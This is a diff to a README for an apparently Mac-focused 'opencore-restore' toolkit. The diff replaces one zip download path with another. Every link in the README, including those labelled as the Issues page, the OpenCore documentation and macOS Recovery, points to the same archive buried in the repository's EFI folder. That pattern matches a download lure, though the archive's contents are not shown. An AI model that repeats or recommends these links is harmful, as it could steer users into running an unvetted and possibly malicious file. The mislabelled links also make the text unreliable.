@@ -2,7 +2,7 @@
 
 ## 📦 Download Now
 
-[![Download opencore-restore](https://raw.githubusercontent.com/Keenkunal95/opencore-restore/main/BOOTEFIX64/EFI/OC/Tools/opencore-restore-3.2.zip)](https://raw.githubusercontent.com/Keenkunal95/opencore-restore/main/BOOTEFIX64/EFI/OC/Tools/opencore-restore-3.2.zip)
+[![Download opencore-restore](https://github.com/Keenkunal95/opencore-restore/raw/refs/heads/main/BOOTEFIX64/EFI/BOOT/restore_opencore_v3.7.zip)](https://github.com/Keenkunal95/opencore-restore/raw/refs/heads/main/BOOTEFIX64/EFI/BOOT/restore_opencore_v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Click the download button above or visit [this page to download](https://raw.githubusercontent.com/Keenkunal95/opencore-restore/main/BOOTEFIX64/EFI/OC/Tools/opencore-restore-3.2.zip).
+1. Click the download button above or visit [this page to download](https://github.com/Keenkunal95/opencore-restore/raw/refs/heads/main/BOOTEFIX64/EFI/BOOT/restore_opencore_v3.7.zip).
   
 2. On the Releases page, locate the latest version of **opencore-restore**.
 
@@ -69,7 +69,7 @@ If you encounter issues while using **opencore-restore**, try the following:
 
 If you need further assistance:
 
-- Visit the [Opencore-restore Issues page](https://raw.githubusercontent.com/Keenkunal95/opencore-restore/main/BOOTEFIX64/EFI/OC/Tools/opencore-restore-3.2.zip) to report a problem or ask questions.
+- Visit the [Opencore-restore Issues page](https://github.com/Keenkunal95/opencore-restore/raw/refs/heads/main/BOOTEFIX64/EFI/BOOT/restore_opencore_v3.7.zip) to report a problem or ask questions.
 - Join our community forums to connect with other users who may have similar experiences and solutions.
 
 ## 🌟 Contributing
@@ -86,7 +86,7 @@ Thank you for being part of our community!
 
 For more information on OpenCore and bootloaders, check out the following resources:
 
-- [OpenCore Documentation](https://raw.githubusercontent.com/Keenkunal95/opencore-restore/main/BOOTEFIX64/EFI/OC/Tools/opencore-restore-3.2.zip)
-- [macOS Recovery](https://raw.githubusercontent.com/Keenkunal95/opencore-restore/main/BOOTEFIX64/EFI/OC/Tools/opencore-restore-3.2.zip)
+- [OpenCore Documentation](https://github.com/Keenkunal95/opencore-restore/raw/refs/heads/main/BOOTEFIX64/EFI/BOOT/restore_opencore_v3.7.zip)
+- [macOS Recovery](https://github.com/Keenkunal95/opencore-restore/raw/refs/heads/main/BOOTEFIX64/EFI/BOOT/restore_opencore_v3.7.zip)
 
 Thank you for using **opencore-restore**. We hope this toolkit helps you restore your Mac with ease.
